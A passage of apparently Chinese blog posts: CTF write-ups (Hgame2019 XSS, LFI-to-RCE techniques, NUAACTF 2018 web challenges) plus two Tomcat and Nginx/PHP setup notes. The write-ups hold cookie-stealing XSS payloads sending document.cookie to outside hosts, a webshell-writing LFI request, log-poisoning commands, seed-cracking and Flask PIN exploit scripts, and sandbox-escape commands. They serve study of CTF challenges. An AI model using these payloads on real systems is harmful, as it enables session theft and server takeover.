\"port\":\"your_port\", \"username\":\"hgame\", \"password\":\"hgame\", \"database\":\"hgame\"}r = requests.post(installURl,installData)# 再次登录，使其再来一次请求。loginData={ \"username\":\"ii5am3\", \"password\":\"123456\",}r = req.post(loginURL,data=loginData)print(r\"[+] login \"+r.text) 读取 flag HappyXSS1234567onerror\"&amp;svgonloadonerror' 随手fuzz了一下，发现以上关键字会被替换为Happy ! 12345&lt;marquee onstart=alert(1)&gt;&lt;marquee onstart=eval(atob('YWxlcnQoMSk='))&gt;&lt;marquee onstart=eval(atob('some base64 code'))&gt; 用&lt;marquee&gt;虽然可以绕，但是Chrome不支持这个标签了，可能这题也用的是Chromeless，然后发现还有CSP策略。 123456789101112HTTP/1.1 200 OKDate: Fri, 22 Feb 2019 10:32:21 GMTServer: Apache/2.4.29 (Ubuntu)Expires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidatePragma: no-cacheContent-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src *X-XSS-Protection: 0Vary: Accept-EncodingContent-Length: 1353Connection: closeContent-Type: text/html; charset=UTF-8 最后我用&lt;body onpageshow进行了绕过 1&lt;body onpageshow=eval(atob('ZnJhbWU9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaWZyYW1lIik7CmRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoZnJhbWUpOwpzY3JpcHQ9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CnNjcmlwdC5zcmM9Jy8veHNzcHQuY29tL0d2eE5Qbic7CndpbmRvdy5mcmFtZXNbMF0uZG9jdW1lbnQuaGVhZC5hcHBlbmRDaGlsZChzY3JpcHQpOw=='))&gt; Base64 内容： 12345frame=document.createElement(\"iframe\");document.body.appendChild(frame);script=document.createElement('script');script.src='//xsspt.com/GvxNPn';window.frames[0].document.head.appendChild(script); 但是以上不能绕CSP策略，可以用window.location绕过 1&lt;body onpageshow=eval(atob('d2luZG93LmxvY2F0aW9uPSJodHRwOi8veW91cl9pcDpwb3J0P2M9Iitkb2N1bWVudC5jb29raWU7'))&gt; base64 内容： 1window.location=\"http://your_ip:port?c=\"+document.cookie; 再给几个其他师傅绕过的 payload : 利用window.open，不过用的是&lt;script &gt;绕过关键字检测 123&lt;script&gt;window.open('http://149.248.6.227:1150/XSS.php?cookie='+document.cookie)&lt;/script&gt;&lt;script &gt;eval(String.fromCharCode(119,105,110,100,111,119,46,111,112,101,110,40,39,104,116,116,112,58,47,47,49,52,57,46,50,52,56,46,54,46,50,50,55,58,49,49,53,48,47,88,83,83,46,112,104,112,63,99,111,111,107,105,101,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))&lt;/script &gt; 还有的用&lt;input onfous绕过 1&lt;input onfocus=javascript:eval(String.fromCharCode(119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,34,104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,58,50,53,48,48,48,47,63,115,61,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,59)); autofocus&gt;","link":"/2019/02/27/Hgame2019/"},{"title":"LFI2RCE","text":"最近遇到了比较多的通过 LFI 提到 RCE 的漏洞利用方法。尤其是在遇到有 phpinfo 的情况下，这里做一个简单的总结与介绍。 LFI 利用 session upload_progress 利用上传临时文件窗口期 利用环境变量 利用日志 总的来说，一般可以用 session 包含的方式尽量避免用 tmp 竞争的方式…血的教训… session upload_progress条件：开启session.upload_progress.enabled，session 文件路径已知，且其中内容部分可控。 当 session.upload_progress.enabled INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态 当一个上传在处理中，同时 POST 一个与 INI 中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当 PHP 检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是 session.upload_progress.prefix 与 session.upload_progress.name连接在一起的值。 php 的 session 文件的保存路径可以在 phpinfo 的 session.save_path 看到。 常见的php-session存放位置： /var/lib/php/sess_PHPSESSID /var/lib/php/sess_PHPSESSID /tmp/sess_PHPSESSID /tmp/sessions/sess_PHPSESSID 我们可以构造一个上传界面 12345678910111213141516171819&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;form action=\"http://zedd.cc/\" method=\"POST\" enctype=\"multipart/form-data\"&gt; &lt;input type=\"file\" name=\"file1\" /&gt; &lt;input type=\"file\" name=\"file2\" /&gt; &lt;input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"123\" /&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 发送以下的 HTTP 请求 1234567891011121314151617181920212223242526272829303132POST /?file=/tmp/php/sess_a HTTP/1.1Host: xxx.ccUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:67.0) Gecko/20100101 Firefox/67.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://zedd.cc/upload.phpContent-Type: multipart/form-data; boundary=---------------------------695725616119701971467121808Content-Length: 703Connection: closeCookie: PHPSESSID=aUpgrade-Insecure-Requests: 1-----------------------------695725616119701971467121808Content-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"&lt;?php file_put_contents(\"/tmp/a\",'&lt;?php eval($_POST[\\'a\\']);?&gt;');?&gt;-----------------------------695725616119701971467121808Content-Disposition: form-data; name=\"file1\"; filename=\"1.txt\"Content-Type: text/php1-----------------------------695725616119701971467121808Content-Disposition: form-data; name=\"file2\"; filename=\"2.txt\"Content-Type: application/octet-stream1-----------------------------695725616119701971467121808Content-Disposition: form-data; name=\"submit\"Submit-----------------------------695725616119701971467121808-- 但是因为 PHP session 会话机制的关系，仅仅一次包含得到的sess_a文件为空，所以我们需要竞争包含，使用 burp intruder 等形式都可以。 大概30次可以成功7次左右，可以看到包含文件回显，但是看不到具体的文件内容，因为有部分 php 代码被解析了，所以我们可以使用tail -f监测sess_a的文件变化查看文件内容，可以看到内容如下： 1upload_progress_&lt;?php file_put_contents(\"/tmp/a\",'&lt;?php eval($_POST[\\'a\\']);?&gt;');?&gt;|a:5:{s:10:\"start_time\";i:1559816745;s:14:\"content_length\";i:690;s:15:\"bytes_processed\";i:690;s:4:\"done\";b:0;s:5:\"files\";a:1:{i:0;a:7:{s:10:\"field_name\";s:5:\"file1\";s:4:\"name\";s:5:\"1.php\";s:8:\"tmp_name\";N;s:5:\"error\";i:0;s:4:\"done\";b:0;s:10:\"start_time\";i:1559816745;s:15:\"bytes_processed\";i:0;}}} 可以发现其中有 php 代码，所以当我们使用include包含该文件的时候会执行该文件当中的 php 代码，让其执行。 tmp条件：tmp 文件路径已知 php中上传文件，会创建临时文件。一般默认 php tmp 目录在 linux 下使用 /tmp 目录，而在 windows 下使用 c:\\winsdows\\temp 目录。在临时文件被删除之前，利用竞争即可包含该临时文件。 如果存在phpinfo()界面即可配合phpinfo()界面的回显来利用，例如向phpinfo()界面上传一个文件，可以得到文件名的回显，再利用一些方法阻塞服务器的操作就可以进行包含了 具体流程如下： 发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据 因为phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大 php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接 所以，我们直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包 此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除 利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终getshell 可以参考脚本exp.py environ利用条件： php以cgi方式运行，这样environ才会保持UA头。 environ文件存储位置已知，且environ文件可读。 在某些环境中，如果存在读取/proc/self/environ的权限，可以检查是否环境变量存在有与 HTTP 环境有关的变量，例如HTTP_USER_AGENT等等 12GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1User-Agent: &lt;?=phpinfo(); ?&gt; 类似地，/proc/self/fd/id（或它的符号链接：/dev/fd）可以与 HTTP Referer 字段结合使用，以通过 apache2 将 payload 注入打开的错误日志中。 但是要确定当前进程的文件描述符。 logaccess log利用条件： 需要知道服务器日志的存储路径，且日志文件可读。 很多时候，web服务器会将请求写入到日志文件中，比如说 apache 。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入 error.log。默认情况下，日志保存路径在 /var/log/apache2/。 在一些场景中，log的地址是被修改掉的。你可以通过读取相应的配置文件后，再进行包含。 ssh log利用条件：需要知道ssh-log的位置，且可读。默认情况下为 /var/log/auth.log 用ssh连接： 1ubuntu@VM-207-93-ubuntu:~$ ssh '&lt;?php phpinfo(); ?&gt;'@remotehost 之后会提示输入密码等等，随便输入。 然后在 remotehost 的 ssh log 中即可写入php代码 mail log如果服务器存在邮件服务，则可以通过邮件发送 payload ，并在/var/log/&lt;user&gt;下包含相关日志（每个其他用户都有自己的文件）。 123mail -s \"&lt;?=phpinfo();?&gt;\" www-data@victim.com &lt; /dev/null---GET vulnerable.php?filename=../../../var/log/www-data HTTP/1.1 ReferencePHP Sessions的妙用之 将 LFI 转换为 RCE php文件包含漏洞 CVV #1: Local File Inclusion","link":"/2019/06/07/LFI2RCE/"},{"title":"Mac idea 启动tomcat端口占用奇异问题","text":"很久不用idea了，突然用idea启动一个tomcat的java web项目，结果一直提示 1Address localhost:1099 already in use 自己通过 1lsof -i :1099 并没有发现端口占用，重装了idea、tomcat都不行，换了一个已经确认是没有占用的端口也还是不行。 经过各种搜索途径找到的都是检查端口占用，再把占用端口的进程关掉即可；或者又是换另一个端口。 对于我这种情况都是无济于事。最后解决方案参考了记一次Mac IntelliJ中Tomcat崩溃的怪异现象（分析与解读） 这里直接提解决方法，就是在/etc/hosts下编辑增加 1127.0.0.1 localhost 这个问题就可以得到解决 如果还有提示cannot run program '/path/to/tomcat/bin/catalina.sh' error=13 permission denied的错误，检查相关文件的权限，这里我是因为重新下载了tomcat导致catalina.sh没有运行的权限，加上以后即可成功运行。","link":"/2018/08/26/Mac-idea-%E5%90%AF%E5%8A%A8tomcat%E7%AB%AF%E5%8F%A3%E5%8D%A0%E7%94%A8%E5%A5%87%E5%BC%82%E9%97%AE%E9%A2%98/"},{"title":"MacOS X 下配置Nginx &amp; PHP","text":"也有一段时间没写博客了，说好的技术博主呢，hhhhh。其实一些小错误感觉没什么好写的。但是配置环境的坑我踩了好久了。趁这次重装了Mac，刚好记录记录配置Nginx，虽然前面写过一篇配置，但是Mac上还是有比较多的坑的。也不知道啥时候Mac才自带Nginx呀。个人喜欢Homebrew，没用Macport，所以下文都是采用的Homebrew。 0x1 Nginx安装通过\bHomebrew安装 12$ brew search nginx$ brew install nginx 然后通过 1$ brew info nginx 你可以看到\b关于nginx的各种信息 12345Docroot is: /usr/local/var/wwwNginx.conf : /usr/local/etc/nginx/nginx.confLog : /usr/local/var/log/nginx 通过 1$ nginx 即可\b启动nginx，访问localhost:8080便可看到Nginx\b欢迎界面 0x2 PHP\b采用了系统的php 1234$ php -vPHP 5.6.30 (cli) (built: Oct 29 2017 20:30:32)Copyright (c) 1997-2016 The PHP GroupZend Engine v2.6.0, Copyright (c) 1998-2016 Zend Technologies 想用php7也可以通过brew进行安装使用 0x3 php-fpm按照\b上面流程走的话，如果在Nginx网站目录下创建一个index.php，内容为phpinfo，会发现访问index.php会出现\b直接下载，那便是因为还没有启动php-fpm以及配置nginx.conf的原因。 Mac自带php-fpm，但是这里还是有比较多坑的。参考来自: Mac 配置 php-fpm 直接运行php-fpm启动php-fpm 123$ php-fpm[04-Mar-2018 00:35:04] ERROR: failed to open configuration file '/private/etc/php-fpm.conf': No such file or directory (2)[04-Mar-2018 00:35:04] ERROR: failed to load configuration file '/private/etc/php-fpm.conf' 错误信息显示，不能打开配置文件，cd /private/etc，发现没有 php-fpm.conf文件，但是有php-fpm.conf.default文件。这个文件是默认配置，我们可以复制一份，改名为php-fpm.conf，然后再根据需要改动配置。 1$ sudo cp /private/etc/php-fpm.conf.default /private/etc/php-fpm.conf 再执行php-fpm 1234$ php-fpmERROR: failed to open error_log (/usr/var/log/php-fpm.log): No such file or directory (2)ERROR: failed to post process the configurationERROR: FPM initialization failed 错误信息显示，不能打开错误日志文件。cd /usr/var/log发现根本没有这个目录，甚至连var目录都没有，加上为了避免权限问题，干脆配置到 /usr/local/var/log目录。 修改php-fpm.conf中error_log 配置为 /usr/local/var/log/php-fpm.log，并把 user 和 group 改为和当前用户一样。 1234567891011121314; Error log file; If it's set to \"syslog\", log is sent to syslogd instead of being written; in a local file.; Note: the default prefix is /usr/var; Default Value: log/php-fpm.logerror_log = /usr/local/var/log/php-fpm.log...; Unix user/group of processes; Note: The user is mandatory. If the group is not set, the default user's group; will be used.user = xxx(当前用户)group = xxx(当前用户组) 怎么查看当前用户以及\b所属组呢？参考链接 1234$ who //查看当前登陆的用户$ finger //用于查找并显示用户信息$ finger xxx //查看用户的信息$ groups xxx //查看用户所属组别 执行 php-fpm，再次报错： 123$ php-fpmNOTICE: [pool www] 'user' directive is ignored when FPM is not running as rootNOTICE: [pool www] 'group' directive is ignored when FPM is not running as root 于是用sudo php-fpm，再次报错： 123$ sudo php-fpmERROR: unable to bind listening socket for address '127.0.0.1:9000': Address already in use (48)ERROR: FPM initialization failed 编辑php-fpm.conf，修改listen为127.0.0.1:9999。\b具体也可以参考Mac如何查看端口占用 其实后来通过检查端口，发现当时占用的也是php-fpm，也有点\b疑惑。 可以用过sudo pkill php-fpm关闭php-fpm 1$ sudo pkill php-fpm \b最后 12php-fpm -t[04-Mar-2018 01:56:01] NOTICE: configuration file /private/etc/php-fpm.conf test is successful 0x4 配置Nginx.confnginx.conf的配置还是\b相当重要的，毕竟是nginx的配置\b文件 网上\b也挺多参考链接 首先，找到server的location配置，给index加一个index.php 1234location / { root html; index index.html index.htm index.php;} 然后配置端口，我改成了80端口，但是每次启动都需要sudo 123server { listen 80; server_name localhost; 接着去掉php相关的注释，并修改 fastcgi_param 参数 12- fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name;+ fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; 所以完整\bphp配置为 123456789# pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000#location ~ \\.php$ { root html; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params;} 重启Nginx 1$ sudo nginx -s reload 0x5 BrBrBr好啦，可以开心地进行开发啦！","link":"/2018/03/04/MacOS-X-%E4%B8%8B%E9%85%8D%E7%BD%AENginx-amp-PHP/"},{"title":"NUAACTF_2018 官方wp","text":"NUAACTF 2018 writeup [TOC] WebWeb1 Asuri-Information-System题目描述12345http://ctf.asuri.org:8001听说有五个很厉害的人，一个是admin,一个是admin1,一个是admin2,一个是admin3,一个是admin4。听说打败他们其中一个就可以拿到flag啦flag格式为NUAACTF{.*} 信息收集根据题目描述，我们要做的肯定就是要去登录admin[1-4] || admin了。 首先进入题目界面，发现题目功能很简单，首页只提供注册登录两个功能。 我们先随便登录注册一下，进去后发现有个重置密码的功能。 重置一下抓包看看。 然后真的发现自己邮箱里面多了一封重置密码的邮件。 扫目录可以得到www.zip，发现题目的所有基本源码。 思路基本的信息如上，然后我们可以根据已有信息来看，从那个重置密码请求包来看，貌似我们可以控制重置用户的用户名。那我们是不是可以重置amdin的密码，通过什么方式登录上呢，而且那个请求包还有回显了一个int也比较奇怪，看起来像是var_dump()出来的数据。 通过大概的代码审计，题目用了在sql语句的地方预编译，所以没什么办法注入得到admin 查看handler源码: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970&lt;?phprequire \"./config.php\";require \"./email.php\";function generatePasswd(){ mt_srand((double) microtime() * 1000000); var_dump(mt_rand()); return substr(md5(mt_rand()),0,6);}function changePasswd($username, $password){ $password = md5($password); $stmt = $GLOBALS['dbh']-&gt;prepare(\"UPDATE users SET password = ? WHERE username = ?\"); $stmt-&gt;bind_param('ss', $password, $username); $stmt-&gt;execute(); if ($stmt-&gt;affected_rows === 1){ echo \"&lt;script&gt;alert(\\\"Success!\\\");history.back(-1);&lt;/script&gt;\"; return; } else echo \"&lt;script&gt;alert(\\\"Error!\\\");history.back(-1);&lt;/script&gt;\"; $stmt-&gt;free_result(); $stmt-&gt;close();}function getEmail($username){ if ($username){ $stmt = $GLOBALS['dbh']-&gt;prepare(\"SELECT email From users where username = ?\"); $stmt-&gt;bind_param('s', $username); $stmt-&gt;bind_result($email); $stmt-&gt;execute(); if($stmt-&gt;fetch()){ return $email; } else return \"error!\"; $stmt-&gt;free_result(); $stmt-&gt;close(); } else{ return \"error!\"; }}$username = isset($_POST['username']) ? trim($_POST['username']) : NULL;$email = getEmail($username);if ($email == \"error!\"){ echo \"Error!\"; die();}$passwd = generatePasswd();if(sendMail($email,$passwd)){ changePasswd($username,$passwd);}else{ echo \"&lt;script&gt;alert(\\\"Error! Check your Email address plz!\\\");history.back(-1);&lt;/script&gt;\";}?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Asuri-Team Managment System&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt; 通过代码审计，我们可以看到传入的username到了getEmail这个函数，这个函数用了预编译，所以我们没什么办法注入。这个函数就是根据username返回对应email，通过generatePasswd()产生随机密码，通过sendMail()发送密码到邮箱，最后用changePasswd()来修改数据库中的密码。 整个逻辑基本清楚了，所以我们是可以通过传入一个username=admin来重置管理员的密码。但是怎么登录成admin呢，我们是不是可以通过爆破随机密码或者破解随机密码来登录呢。 我们重点看看generatePasswd() 12345function generatePasswd(){ mt_srand((double) microtime() * 1000000); var_dump(mt_rand()); return substr(md5(mt_rand()),0,6);} 我们可以看到，页面上的int(2055522123)即是var_dump(mt_rand());的显示结果。 可以看看 1234void mt_srand ([ int $seed ] )用 seed 来给随机数发生器播种。 没有设定 seed 参数时，会被设为随时数。Note: 自 PHP 4.2.0 起，不再需要用 srand() 或 mt_srand() 给随机数发生器播种 ，因为现在是由系统自动完成的。 然后随机数种子是(double) microtime() * 1000000 12345678mixed microtime ([ bool $get_as_float ] )microtime() 当前 Unix 时间戳以及微秒数。本函数仅在支持 gettimeofday() 系统调用的操作系统下可用。如果调用时不带可选参数，本函数以 \"msec sec\" 的格式返回一个字符串，其中 sec 是自 Unix 纪元（0:00:00 January 1, 1970 GMT）起到现在的秒数，msec 是微秒部分。字符串的两部分都是以秒为单位返回的。如果给出了 get_as_float 参数并且其值等价于 TRUE，microtime() 将返回一个浮点数。Note: get_as_float 参数是 PHP 5.0.0 新加的。 所以这里microtime() * 1000000是不超过7位数的，而且第一次随机数我们已经得到了，我们可以通过爆破随机数种子来得到随机数。 贴一个自己写的php exp 12345678910111213141516171819202122&lt;?php// echo ((double) microtime() * 1000000).\"\\n\";// mt_srand((double) microtime() * 1000000);// var_dump(mt_rand());// echo substr(md5(mt_rand()),0,6);// int(1409622410)// bc700b$seed = 0;for($i = 0;$i &lt; 1000000; $i++){ mt_srand($i); $str = mt_rand(); if($str === 1796651235){ $seed = $i; }}echo $seed.\"\\n\";mt_srand($seed);mt_rand();echo substr(md5(mt_rand()),0,6); 猜解得到密码登录就可以得到flag 这里避免给大家竞争随机…就给了5个amdin，其实应该注册一个就对应给一个admin，但是感觉5个应该差不多了… Web2 男航理工大学选课系统题目描述12345http://ctf.asuri.org:8003小火汁，听说你想选课？flag格式为NUAACTF{.*} 信息收集题目设置非常简单 就一个登录注册界面。然后给了一个www.zip的附件，放出了关键源码。 然后，随便点一个选课，就报错了。 再看看源码，其中在user.py中发现 1234567@users.route('/asserts/&lt;path:path&gt;')def static_handler(path): filename = os.path.join(app.root_path,'asserts',path) if os.path.isfile(filename): return send_file(filename) else: abort(404) 解题这个题熟悉flask的会发现，那个报错页面其实就是开启了debug的界面，我们可以利用pin码来认证debug界面进行命令执行。 而关于pin码，我看赛时很多队伍都采取爆破的方式，导致输入过多，就不能再输入了。就导致我赛时只能人肉运维重置web2。 12345678md5_list = [ 'root', #当前用户，可通过读取/etc/passwd获取 'flask.app', #一般情况为固定值 'Flask', #一般情况为固定值 '/usr/local/lib/python2.7/dist-packages/flask/app.pyc', #可通过debug错误页面获取 '2485377892354', #mac地址的十进制，通过读取/sys/class/net/eth0/address获取mac地址 如果不是映射端口 可以通过arp ip命令获取 '0c5b39a3-bba2-472c-a43d-8e013b2874e8' #机器名，通过读取/proc/sys/kernel/random/boot_id 或/etc/machine-id获取 ] 生成pin码的代码 12345678910111213141516171819def get_pin(md5_list):trueh = hashlib.md5()truefor bit in md5_list:truetrueif not bit:truetruetruecontinuetruetrueif isinstance(bit, unicode):truetruetruebit = bit.encode('utf-8')truetrueh.update(bit)trueh.update(b'cookiesalt')trueh.update(b'pinsalt')truenum = ('%09d' % int(h.hexdigest(), 16))[:9]truefor group_size in 5, 4, 3:truetrueif len(num) % group_size == 0:truetruetruerv = '-'.join(num[x:x + group_size].rjust(group_size, '0')truetruetruetruetruetrue for x in range(0, len(num), group_size))truetruetruebreaktrueelse:truetruerv = numtruereturn rv 拿到pin码便可执行命令。 具体可以参考Flask debug pin安全问题 贴一下这题得到的exp 123456789101112131415161718192021222324252627282930313233import hashlibdef get_pin(md5_list):trueh = hashlib.md5()truefor bit in md5_list:truetrueif not bit:truetruetruecontinuetruetrueif isinstance(bit, unicode):truetruetruebit = bit.encode('utf-8')truetrueh.update(bit)trueh.update(b'cookiesalt')trueh.update(b'pinsalt')truenum = ('%09d' % int(h.hexdigest(), 16))[:9]truefor group_size in 5, 4, 3:truetrueif len(num) % group_size == 0:truetruetruerv = '-'.join(num[x:x + group_size].rjust(group_size, '0')truetruetruetruetruetrue for x in range(0, len(num), group_size))truetruetruebreaktrueelse:truetruerv = numtruereturn rvname = get_name()md5_list = [ 'ctf', 'flask.app', 'Flask', '/usr/local/lib/python2.7/dist-packages/flask/app.pyc', '2485378285570', '' ]print get_pin(md5_list) 这里可能比较坑的是/usr/local/lib/python2.7/dist-packages/flask/app.pyc跟machine_id是空两处。不过通过几次尝试也都可以尝试出来。难度并不算大。 然后就是命令执行，一个简单没有任何过滤的Python沙盒，方法很多。 这里简单给个事例 12345[console ready]&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__(\"os\").popen(\"ls\").read()' )'APP\\nflag\\nrun.py\\ntest.py\\nwww.zip\\n'&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__(\"os\").popen(\"cat ./flag\").read()' )'NUAACTF{F14sssskkkrrr_D3Bug_n0t_S4f3}' Web3 张哥的金牌之旅题目描述信息收集打开发现是个java框架。 提供了简单的登录注册。 然后发现只有A+B问题可以点 代码提交页面提供代码提交，查看最后一次提交的代码功能。 引用代码提示 1请以代码文件为url，例如http://mysite.com/main.c，仅支持c,cpp,java,py,js,cs的提交 然后提交一个https://raw.githubusercontent.com/php/php-src/master/ext/zlib/zlib.c，发现返回代码过多，再找个几行代码的https://gitee.com/CheungSSH_OSC/CheungSSH/raw/master/bin/DataConf.py 返回提示成功，查看上一次提交代码，发现以源码方式返回。还有个下载代码的功能，得到一个文件名为用户名经过md5后的txt文件。 思路既然引用代码处，可以引用http协议的url，那我们可以试试用file如何。 发现是forbidden，通过fuzz我们可以得到jar netdoc两个java SSRF支持的协议没有被ban，而且需要再最后加入?1.c来绕过后缀检测 然后查看最后一次代码提交，发现并没有什么改变。 试试netdoc，传入netdoc:///?1.c 发现可以得到回显 但是直接请求flag，发现被ban掉了，所以我们得另寻他路。 突破口通过查看一系列文件，发现如果直接读class文件的话，直接展示出来了class二进制文件，那我们下载下来会不会也是class文件的形式呢 下载下来后，我们用file看一下，果然是个java class文件 用JD-GUI打开得到源码 题目描述说需要逆向师傅其实指的就是这里需要逆向class文件，（其实也不需要…直接用JD-GUI直接就能看了… 这里省略了其他源码的审计。 然后看到貌似多出的这个User.class类，然后发现了比较敏感的readObject()函数，java反序列化漏洞特征，可能存在java反序列化漏洞 然后找到其利用的地方，发现在netdoc:///app/webapps/ROOT/WEB-INF/classes/org/nuaa/tomax/logindemo/controller/UserController.class调用了User类。 UserController.class的关键部分: 123456789101112@PostMapping({\"/record\"}) public void record(long userId, HttpSession session, String cmd) throws Exception { Timestamp timestamp = new Timestamp(System.currentTimeMillis()); UserEntity user = (UserEntity)session.getAttribute(\"user_\" + userId); if (cmd != null) { User mUsr = new User(user.getId(), user.getUsername(), cmd, timestamp); SysUtil.recordCmd(mUsr); } } 在看到SysUtil.class: 发现竟然有部分貌似真的需要逆向，但是其实仔细往下看，利用点跟上面那段代码没太大关系。 看到recordCmd()，可以说是非常标准的java反序列化的代码了。 123456789101112131415public static void recordCmd(User user) throws IOException, ClassNotFoundException { FileOutputStream fos = new FileOutputStream(\"object\"); ObjectOutputStream os = new ObjectOutputStream(fos); os.writeObject(user); os.close(); FileInputStream fis = new FileInputStream(\"object\"); ObjectInputStream ois = new ObjectInputStream(fis); User outUsr = (User)ois.readObject(); ois.close(); } 接着我们回到User.class，很明显，这里可以控制传入cmd，我们再看看User.class的关键代码: 12345678910111213141516171819202122232425262728293031323334private static final String[] BLACKLIST = { \"$\", \"{\", \"}\", \"`\", \"base64\", \"&amp;\", \";\", \"||\", \"%\", \"(\", \")\", \"rm\", \"echo\"};public User(long id, String username, String cmd, Timestamp time){ this.id = id; this.username = username; this.cmd = cmd; this.time = time;}private void readObject(ObjectInputStream in) throws Exception { in.defaultReadObject(); if (checkCmd(this.cmd).booleanValue()) { String cmd_pre = \"sleep $(\"; String cmd_suf = \")\"; String exec = cmd_pre + this.cmd + cmd_suf; String[] cmds = { SysUtil.asciiToString(\"47,98,105,110,47,98,97,115,104\"), SysUtil.asciiToString(\"45,99\"), exec }; SysUtil.execCmd(cmds); } } public Boolean checkCmd(String cmd) { for (String symbol : BLACKLIST) { if (cmd.contains(symbol)) { return Boolean.valueOf(false); } } return Boolean.valueOf(true); } cmds转换为ascii就是 1String[] cmds = { \"/bin/bash\", \"-c\", exec }; exec就是传入的cmd，然而这里利用点比较尴尬，因为我们传入的代码是被exec是被sleep $()给包围起来的，而关键的一些绕过都进了黑名单 1private static final String[] BLACKLIST = { \"$\", \"{\", \"}\", \"`\", \"base64\", \"&amp;\", \";\", \"||\", \"%\", \"(\", \")\", \"rm\", \"echo\"}; 这里我们可以使用命令执行盲注的形式进行对flag猜解。稍后我会详细写一篇文章讲解命令盲注的方式。 我们可以采用cat /flag | cut -c 1 | tr N 10这样的形式对flag进行猜解。 cat /flag读取/flag中的内容 cut -c 1截取第一个字符 tr N 10用10来代替flag中的字母N 所以，通过把flag中的内容读出来之后，用字母代替进行sleep，如果猜解对的话，并且排除网络原因，页面会延缓5s才返回，所以我们可以利用这个特性把flag猜解出来。 其实这里设置得不太好，应该把flag改成全英文比较好一些得到flag。也可以用burp intruder来猜解。 Web4 Pentest首先发现 url 有文件读取，利用 1http://localhost:8004/index.php?action=php://filter/read=convert.base64-encode/resource=index.php 读取源码，扫目录得到 1234567891011[22:52:52] 301 - 311B - /img -&gt; http://localhost:8004/img/[22:52:52] 302 - 104B - /index.php -&gt; /index.php?action=show.php[22:52:52] 200 - 169B - /INDEX.PHP[22:52:52] 200 - 169B - /index.PHP[22:52:52] 302 - 104B - /index.php/login/ -&gt; /index.php?action=show.php[22:52:52] 200 - 83KB - /info.php[22:52:55] 403 - 299B - /server-status[22:52:55] 403 - 300B - /server-status/[22:52:56] 200 - 772B - /upload.phpTask Completed 直接查看 upload.php 的源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136&lt;?php$addr = md5(\"hac425\".$_SERVER['REMOTE_ADDR']);$sandbox = '/var/www/html/' .$addr ;@mkdir($sandbox);@chdir($sandbox);$is_upload = false;$msg = null;$UPLOAD_ADDR = \"\";if (isset($_POST['submit'])){ // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES['upload_file']['name']; $filetype = $_FILES['upload_file']['type']; $tmpname = $_FILES['upload_file']['tmp_name']; $target_path=$UPLOAD_ADDR.basename($filename); // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,\".\"),1); //判断文件后缀与类型，合法才进行上传操作 if(($fileext == \"jpg\") &amp;&amp; ($filetype==\"image/jpeg\")){ if(move_uploaded_file($tmpname,$target_path)) { //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); if($im == false){ $msg = \"该文件不是jpg格式的图片！\"; }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\".jpg\"; $newimagepath = $UPLOAD_ADDR.$newfilename; imagejpeg($im,$newimagepath); //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = $UPLOAD_ADDR.$newfilename; unlink($target_path); $is_upload = true; } } else { $msg = \"上传失败！\"; } }else if(($fileext == 